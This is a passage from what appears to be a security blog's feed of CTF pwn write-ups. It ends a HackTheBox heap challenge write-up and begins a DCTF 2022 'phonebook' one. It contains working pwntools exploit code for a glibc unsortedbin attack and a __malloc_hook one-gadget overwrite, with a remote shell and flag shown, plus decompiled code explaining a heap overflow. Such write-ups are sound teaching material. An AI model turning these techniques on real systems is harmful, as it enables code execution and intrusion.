      <span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">))</span>
        <span class="p">{</span>
          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
              <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">victim</span><span class="p">)</span>
				   <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): memory corruption&#34;</span><span class="p">);</span>
          <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>

          <span class="cm">/*
</span><span class="cm">             If a small request, try to use last remainder if it is the
</span><span class="cm">             only chunk in unsorted bin.  This helps promote locality for
</span><span class="cm">             runs of consecutive small requests. This is the only
</span><span class="cm">             exception to best-fit, and applies only when there is
</span><span class="cm">             no exact fit for a small chunk.
</span><span class="cm">           */</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
              <span class="n">bck</span> <span class="o">==</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
              <span class="n">victim</span> <span class="o">==</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">last_remainder</span> <span class="o">&amp;&amp;</span>
              <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
            <span class="p">{</span>
              <span class="cm">/* split and reattach remainder */</span>
              <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
              <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
              <span class="n">av</span><span class="o">-&gt;</span><span class="n">last_remainder</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
              <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">remainder_size</span><span class="p">))</span>
                <span class="p">{</span>
                  <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
                  <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
                <span class="p">}</span>

              <span class="n">set_head</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
                        <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span> <span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
              <span class="n">set_head</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
              <span class="n">set_foot</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span><span class="p">);</span>

              <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
              <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
              <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
            <span class="p">}</span>

          <span class="cm">/* remove from unsorted list */</span>
          <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>

          <span class="cm">/* Take now instead of binning if exact fit */</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="n">nb</span><span class="p">)</span>
            <span class="p">{</span>
              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
		<span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="cp">#if USE_TCACHE
</span><span class="cp"></span>	      <span class="cm">/* Fill cache first, return to user only if cache fills.
</span><span class="cm">		 We may return one of these chunks later.  */</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">tcache_nb</span>
		  <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
		<span class="p">{</span>
		  <span class="n">tcache_put</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
		  <span class="n">return_cached</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		  <span class="k">continue</span><span class="p">;</span>
		<span class="p">}</span>
	      <span class="k">else</span>
		<span class="p">{</span>
<span class="cp">#endif
</span><span class="cp"></span>              <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
              <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
              <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
              <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
<span class="cp">#if USE_TCACHE
</span><span class="cp"></span>		<span class="p">}</span>
<span class="cp">#endif
</span><span class="cp"></span>            <span class="p">}</span>

	<span class="p">[...]</span>
<span class="p">}</span>
</code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
</span><span class="s2">Before:
</span><span class="s2">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
</span><span class="s2">unsortedbin
</span><span class="s2">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">55</span><span class="p">)</span> <span class="c1"># pop it to access to chunk_1</span>

<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># restore valid fastbin chunk part of the 0x30 freelist</span>
<span class="c1"># put it back to the fastbin </span>

<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3ebca0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stdin</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
<span class="c1"># Write after free, &amp;stdin-&gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">After:
</span><span class="s2">0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
</span><span class="s2">unsortedbin
</span><span class="s2">all [corrupted]
</span><span class="s2">FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
</span><span class="s2">Before: same as above
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="c1"># == clean fastbin</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x40</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x30</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>

<span class="c1"># == clean fastbin</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">fastbins
</span><span class="s2">0x30: 0x0
</span><span class="s2">0x40: 0x0
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>Now we just have to ask for a <code>0x30</code> sized chunk:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1337&#34;</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;unsortedbin attack done on: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdin</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Enjoy your shell!&#34;</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">After:
</span><span class="s2">0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfca0 &lt;- stdin-&gt;_IO_buf_end
</span><span class="s2">0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0 &lt;- unsortedbin
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="fsop--profit">
        FSOP + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#fsop--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor FSOP &#43; PROFIT" href="#fsop--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The last part is very easy, we just have to overflow up to <code>&amp;__malloc_hook</code> to write the one-gadget:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> 
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">)</span> 
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> 
        <span class="sa">b</span><span class="s2">&#34;4</span><span class="se">\n\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3ed8d0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3ebae0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000ffffffff</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3e82a0</span><span class="p">)</span> <span class="o">+</span> 
        <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x150</span> <span class="o">+</span>  
        <span class="c1"># !!!!! </span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x10a38c</span><span class="p">)</span> <span class="c1"># &lt;- one-gadget</span>
        <span class="c1">#pwn.p64(libc + 0x4f322) </span>
        <span class="c1"># pwn.p64(0x1337) </span>
        <span class="p">)</span>
<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
</span><span class="s2">constraints:
</span><span class="s2">  [rsp+0x70] == NULL
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger <code>__malloc_hook</code> :).</p>
<p>Which gives:</p>
<pre tabindex="0"><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
[*] '/mnt/once_and_for_all'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/mnt/out'
[+] Opening connection to 167.172.56.180 on port 30332: Done
[*] Switching to interactive mode

How much space do you need for this massive weapon: Adding to your inventory..
$ id
uid=100(ctf) gid=101(ctf)
$ ls
flag.txt
glibc
once_and_for_all
$ cat flag.txt
HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
</code></pre>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/HackTheBox" term="HackTheBox" label="HackTheBox" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[DCTF 2022 - pwn] phonebook]]></title>
            <link href="https://nasm.re/posts/phonebook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/phonebook/</id>
            
            <published>2022-04-17T00:00:00+00:00</published>
            <updated>2022-04-17T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="intro">
        Intro
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#intro" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Intro" href="#intro">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>phonebook is a basic heap challenge I did during the dctf event. It&rsquo;s basically just a heap overflow wich allows us to overflow a function pointer with for example the address of system.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="the-bug">
        The bug
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>$ ./phonebook
Choose an option: [1-5]
1. Store someone's information
2. Edit information
3. Call someone
4. Unfriend someone
5. Add the hidden_note
&gt; 
</code></pre><p>We can create an entity and then initialize: a name, a numero and a function pointer.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Person with id %d already exists!&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span>
  <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">get_name</span><span class="p">();</span>
  <span class="n">LODWORD</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Phone number: &#34;</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span> <span class="c1">// phone number
</span><span class="c1"></span>  <span class="n">s</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">choose_relation</span><span class="p">();</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The bug lies <code>edit_name</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">name_size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
  <span class="n">name_size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name length: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">name_size</span> <span class="o">!=</span> <span class="n">n</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>We can give it a new lentgh and if that&rsquo;s not equal to the current size field it frees the current name pointer and allocates a new name pointer <strong>without</strong> updating the size field. Which means if we edit the name pointer with a smaller size, the name pointer will be smaller compared to the size field, then we just have to edit again the size field to make it equal to <code>v4-&gt;name_size</code> to trigger a heap overflow through the <code>v4-&gt;name</code> pointer.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="leak-libc">
        Leak libc
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#leak-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak libc" href="#leak-libc">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we&rsquo;re able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free&rsquo;d chunks in the unsortedbin. Or we can leak the <code>entity-&gt;func</code> function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of <code>puts</code> to leak its address within the libc.</p>
<p>To do so we can create another entity right after the name pointer:</p>
<pre tabindex="0"><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
0x559b0d4d16f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1700	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1710	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1720	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1730	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1740	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1750	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1760	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1770	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1780	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1790	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17e0	0x4141414141414141	0x0000414141414141	AAAAAAAAAAAAAA..
0x559b0d4d17f0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1800	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
